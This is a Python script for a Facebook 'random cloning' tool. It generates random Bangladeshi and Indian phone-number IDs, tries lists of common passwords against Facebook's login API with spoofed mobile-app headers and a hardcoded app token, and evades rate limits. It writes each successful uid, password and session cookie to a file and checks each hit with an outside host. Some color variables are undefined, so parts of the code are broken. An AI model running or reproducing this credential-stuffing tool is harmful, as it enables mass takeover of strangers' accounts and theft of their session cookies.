#__________________[ IMPORT ]__________________#
import os,zlib
from os import system as osRUB
from os import system as cmd
try:
    import requests 
except ImportError:
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Tuhin
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#__________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#__________________[ SYS ]__________________#
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#━━━━[ COLORS ]━━━━#
orange = "\x1b[38;5;196m"
black = "\033[1;30m"
red = "\x1b[38;5;160m"
green="\x1b[38;5;46m"
yellow="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
magenta="\x1b[35m"
cyan="\033[1;36m"
white="\033[1;37m"
bkblack="<x1b[40m"
bkred="\x1b[41m"
bkgreen= "\x1b[42m"
bkyellow= "\x1b[43m"
bkblue= "\x1b[44m"
bkmagenta= "\x1b[45m"
bkcyan= "\x1b[46m"
bkwhite= "\x1b[47m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
sys.stdout.write('\x1b]2; ABIR x ADRIYAN\x07') 
#__________________[ LINE]__________________#
def line():
    print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
    os.system('clear')
    print(logo)
    
#__________________[ LOGO ]__________________#
logo=(f"""
{green}╔═══╗{red}╔═══╗{yellow}╔══╗{green}╔═══╗{red}╔═══╗{yellow}╔═══╗
{green}║╔═╗║{red}║╔═╗║{yellow}╚╣╠╝{green}╚╗╔╗║{red}║╔══╝{yellow}║╔═╗║
{green}║╚══╗{red}║╚═╝║{white}─{yellow}║║{white}──{green}║║║║{red}║╚══╗{yellow}║╚═╝║
{green}╚══╗║{red}║╔══╝{white}─{yellow}║║{white}──{green}║║║║{red}║╔══╝{yellow}║╔╗╔╝
{green}║╚═╝║{red}║║{white}───{yellow}╔╣╠╗{green}╔╝╚╝║{red}║╚══╗{yellow}║║║╚╗
{green}╚═══╝{red}╚╝{white}───{yellow}╚══╝{green}╚═══╝{red}╚═══╝{yellow}╚╝╚═╝ {red}[{green}JUST FOR FUN BRO{red}]
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{red}[{green}✦{red}] {green}ADMIN     {white}➤ {green}ABIR {red}〆{green} ADRIYAN 
{red}[{green}✦{red}] {green}GIT HUB   {white}➤ {green}ABIR{red}x{green}ADRIYAN
{red}[{green}✦{red}] {green}DEVELOPER {white}➤ {green}MH-ABIR     
{red}[{green}✦{red}] {green}BROTHER {white}  ➤ {green}ADRIYAN CHOWDHURY
{red}[{green}✦{red}] {green}VERSION   {white}➤ {red}PRIVET
{red}[{green}✦{red}] {green}TOOL TYPE {white}➤ {green}FREE{red}({red}{faltu}{red}RANDOM CLONE{pvt}{red})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        line()
        print(f'[=] THE PROCESS HAS BEEN COMPLETE...')
        print(f'[=] TOTAL OK : %s' % str(len(oks)))
        print(f'[=] TOTAL CP : %s' % str(len(cps)))
        line()
        input(f"[=] PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'[1] RANDOM CLONING')
    print(f'[2] CONTACT TOOL OWNER')
    print(f'[3] EXIT TOOLS')
    line()
    select = input(f'[?] CHOICE : ')
    if select =='1':
        _randm_()
    elif select =='2':
        os.system('xdg-open https://m.me/zeycost');menu()
    elif select =='3':
        exit(f'[=] EXIT DONE ')
    else:
        print(f'[=] VALID OPTION')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'[1] BANGLADESH CLONING')
    print(f'[2] INDIA CLONING')
    print(f'[0] BACK TO MAIN MENU')
    line()
    select = input(f'[?] CHOICE : ')
    if select =='1':
        _bd_()
    elif select =='2':
        _India_()
    elif select =='0':
    	menu()
    else:
        print(f'[=] VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'[=] EXAMPLE : 017/019/018/016');line()
    code = input(f'[?] CHOICE  : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'[=] EXAMPLE : 3000/5000/10000/99999');line()
    limit = int(input(f'[?] CHOICE  : '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with Tuhin(max_workers=30) as tuhin:
        clear()
        print(f'[=] SIM CODE  : {code}')
        print(f'[=] TOTAL UID : {str(len(user))}')
        print(f'[=] TURN [ON/OFF] AIRPLANE MODE EVERY 3 MIN');line()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
            tuhin.submit(randm,ids,psd)
    print('')
    line()
    print(f'[=] THE PROCESS HAS BEEN COMPLETED')
    print(f'[=] TOTAL OK ID : {str(len(ok))}')
    print(f'[=] TOTAL CP ID : {str(len(cp))}')
    line()
    input(f'[=] PRESS ENTER TO BACK ')
    menu()
#__________________[ INDIA ]__________________#
def _India_():
    clear()
    print(f'[=] EXAMPLE : +91639/+91934/+91902/+91701');line()
    code = input(f'[?] CHOICE  : ')
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 3000{A}/{G1}5000{A}/{G1}10000{A}/{G1}99999');line()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}:{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Tuhin(max_workers=30) as tuhin:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G1}]{G1} TOTAL UID {A}:{G1} {str(len(user))}')
        print(f'{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{A}/{A}OFF{G1}]{G1} AIRPLANE MODE EVERY {A}3{G1} MIN');line()
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','07860786']
            tuhin.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G1}]{G1} TOTAL OK ID {A}:{G1} {str(len(ok))}')
    print(f'{G1}[{A}={G1}]{G1} TOTAL CP ID {A}:{G1} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G1}[{A}={G1}]{G1} PRESS ENTER TO BACK ')
    menu()

#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}TUHIN-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/354.0.0.22.110;FBBV/350972604;FBDM/{density=2.8125,width=1080,height=2174};FBLC/en_US;FBRV/353164086;FBCR/Swisscom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M515F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'MOBILE.LTE',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}TUHIN-💚{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/TUHIN-RNDM-COOKIE.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}CP-💔{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
          
menu()
#__________________[ END ]__________________#